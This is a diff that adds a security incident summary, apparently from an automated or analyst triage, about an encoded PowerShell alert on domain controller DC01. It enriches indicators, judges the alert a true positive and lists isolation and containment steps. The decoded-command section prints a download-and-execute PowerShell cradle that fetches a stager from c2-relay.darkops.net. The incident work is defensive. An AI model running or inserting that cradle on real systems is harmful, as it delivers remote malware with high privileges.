@@ -1,0 +1,100 @@
+# Security Investigation Summary
+
+## Alert Classification and Severity Assessment
+
+**Alert Type:** High Severity PowerShell Defense Evasion Attack  
+**Risk Score:** 87/100  
+**Classification:** Command and Control (C2) Communication Attempt  
+**MITRE ATT&CK Techniques:** T1059.001 (PowerShell), T1027 (Obfuscated Files)
+
+## Indicators of Compromise Analysis
+
+### 1. **Destination IP: 198.51.100.99**
+- **Risk Level:** LOW (False Positive)
+- **Analysis:** This is a TEST-NET-1 reserved IP address (RFC 5737) used for documentation and testing
+- **VirusTotal:** 0/94 malicious detections, marked as "private" and "harmless"
+- **AbuseIPDB:** 0% abuse confidence score, marked as "Reserved" usage type
+- **Note:** While some test reports exist, this IP is not routable on the internet
+
+### 2. **Domain: c2-relay.darkops.net**
+- **Risk Level:** HIGH (Suspicious)
+- **Analysis:** Domain name suggests command-and-control infrastructure
+- **VirusTotal:** 0/94 detections but tagged as "dga" (Domain Generation Algorithm)
+- **WHOIS:** Registered 2013-11-28, expires 2024-11-28 (expired), privacy-protected registration
+- **Registrar:** EurotrashNames.com LLC (suspicious registrar name)
+- **DNS:** Uses interim nameservers, no current DNS resolution
+
+### 3. **URL: https://c2-relay.darkops.net/stager.ps1**
+- **Risk Level:** HIGH (Malicious Intent)
+- **Analysis:** URL not found in VirusTotal database (404 error)
+- **Purpose:** PowerShell stager payload download attempt
+- **File:** stager.ps1 suggests first-stage malware dropper
+
+### 4. **PowerShell Hash: de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c**
+- **Risk Level:** LOW (Legitimate Binary)
+- **Analysis:** Legitimate Microsoft PowerShell executable (Windows Server 2019)
+- **VirusTotal:** 0/75 malicious detections, signed by Microsoft
+- **Sigma Rules:** 6 triggered rules (2 high, 4 medium severity) for suspicious execution patterns
+- **Verdict:** Legitimate binary being abused for malicious purposes
+
+### 5. **Host Information**
+- **Affected System:** DC01 (Domain Controller)
+- **Internal IP:** 10.0.1.10
+- **User Context:** NT AUTHORITY\SYSTEM
+- **Risk:** CRITICAL - Domain controller compromise attempt
+
+## Decoded PowerShell Command Analysis
+
+The base64 encoded command decodes to:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
+```
+
+This is a classic malware dropper pattern that:
+- Uses `Invoke-Expression (IEX)` to execute downloaded content
+- Downloads a PowerShell script from a suspicious domain
+- Executes with SYSTEM privileges on a domain controller
+
+## Risk Assessment Summary
+
+| Indicator | Type | Risk Level | Confidence |
+|-----------|------|------------|------------|
+| 198.51.100.99 | IP Address | LOW | High (Test IP) |
+| c2-relay.darkops.net | Domain | HIGH | High (Suspicious naming) |
+| stager.ps1 URL | URL | HIGH | High (Malware dropper) |
+| PowerShell Binary | File Hash | LOW | High (Legitimate MS binary) |
+| DC01 Compromise | Host | CRITICAL | High (Domain Controller) |
+
+## Overall Verdict: **TRUE POSITIVE**
+
+Despite the destination IP being a test address, this represents a legitimate security incident because:
+
+1. **Attack Pattern:** Classic PowerShell-based malware dropper technique
+2. **Target:** Domain controller (high-value target)
+3. **Execution Context:** SYSTEM privileges
+4. **Evasion Techniques:** Encoded commands, execution policy bypass, hidden window
+5. **Suspicious Domain:** c2-relay.darkops.net suggests malicious infrastructure
+
+## Recommended Next Steps
+
+### Immediate Actions (Priority 1)
+1. **Isolate DC01** from the network to prevent lateral movement
+2. **Terminate** the PowerShell process (PID 4128) if still running
+3. **Check** for successful payload download and execution
+4. **Review** DC01 for signs of compromise (new accounts, scheduled tasks, persistence mechanisms)
+
+### Investigation Actions (Priority 2)
+1. **Analyze** parent process cmd.exe (PID 2048) and its origin
+2. **Search** for other systems attempting to contact c2-relay.darkops.net
+3. **Review** authentication logs for suspicious logons to DC01
+4. **Check** for similar PowerShell executions across the environment
+5. **Examine** network logs for any successful connections to 198.51.100.99
+
+### Containment Actions (Priority 3)
+1. **Block** c2-relay.darkops.net at DNS and firewall level
+2. **Reset** credentials for accounts that may have been compromised
+3. **Scan** all domain controllers for similar indicators
+4. **Review** PowerShell execution policies and logging configuration
+5. **Implement** additional monitoring for encoded PowerShell commands
+
+This incident represents a serious attempt to compromise critical domain infrastructure and should be treated as a high-priority security incident requiring immediate response.
